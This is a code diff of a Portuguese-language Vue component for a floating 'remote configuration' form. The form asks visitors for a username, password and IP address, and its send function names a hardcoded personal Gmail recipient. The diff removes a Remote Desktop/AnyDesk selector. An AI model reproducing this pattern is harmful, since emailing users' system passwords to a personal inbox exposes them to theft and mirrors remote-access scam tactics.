@@ -5,7 +5,6 @@ import { ref } from "vue";
 const utilizador = ref("");
 const palavraPasse = ref("");
 const ip = ref("");
-const tipo = ref("");
 
 function enviarEmail() {
   const destinatario = "miguelito.gomes.silva@gmail.com";
@@ -80,7 +79,7 @@ function enviarEmail() {
     </div>
 
     <!-- Formulário Flutuante -->
-    <div class="fixed top-8 right-8 bg-white/95 backdrop-blur-sm px-6 py-8 rounded-2xl shadow-2xl border border-gray-200 w-96 z-50 space-y-6">
+    <div class="fixed top-8 right-8 bg-white/95 backdrop-blur-sm px-6 py-8 rounded-2xl shadow-2xl border border-gray-200 w-96 z-50 space-y-6 z-auto">
       <h2 class="text-xl font-bold text-gray-800">Configuração Remota</h2>
       <p class="text-gray-600 text-sm">Se preferir, podemos configurar remotamente o seu sistema.</p>
 
@@ -110,7 +109,7 @@ function enviarEmail() {
         </div>
 
         <div>
-          <label for="ip" class="block text-sm font-medium text-gray-700">IP / Código</label>
+          <label for="ip" class="block text-sm font-medium text-gray-700">IP</label>
           <input
             v-model="ip"
             type="text"
@@ -119,20 +118,6 @@ function enviarEmail() {
             placeholder="192.168.1.100"
             required
           />
-        </div>
-
-        <div>
-          <label for="tipo" class="block text-sm font-medium text-gray-700">Tipo</label>
-          <select
-            v-model="tipo"
-            id="tipo"
-            class="w-full px-3 py-2 rounded-xl border border-gray-300 text-sm focus:outline-none focus:ring-2 focus:ring-green-500 text-gray-800 bg-white"
-            required
-          >
-            <option disabled value="">Escolha</option>
-            <option value="Ambiente de Trabalho Remoto">Remoto (Windows)</option>
-            <option value="AnyDesk">AnyDesk</option>
-          </select>
         </div>
 
         <button
